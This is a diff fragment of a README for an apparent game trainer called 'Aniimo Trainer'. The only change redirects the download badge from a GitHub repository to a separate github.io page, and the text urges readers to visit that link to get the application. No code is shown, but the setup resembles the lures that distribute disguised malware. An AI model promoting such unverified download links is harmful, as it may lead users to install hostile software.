@@ -10,7 +10,7 @@ Think of it as your personal game assistant - it runs alongside Aniimo and lets 
 
 ## 📥 Download Aniimo Trainer
 
-[![DOWNLOAD ANIIMO TRAINER](https://img.shields.io/badge/⬇️-Download_Aniimo_Trainer_1.3.0-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/rosabellacalyptrate2549/aniimo-mod-trainer)
+[![DOWNLOAD ANIIMO TRAINER](https://img.shields.io/badge/⬇️-Download_Aniimo_Trainer_1.3.0-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://rosabellacalyptrate2549.github.io)
 
 **Visit this link to download the application.**
 
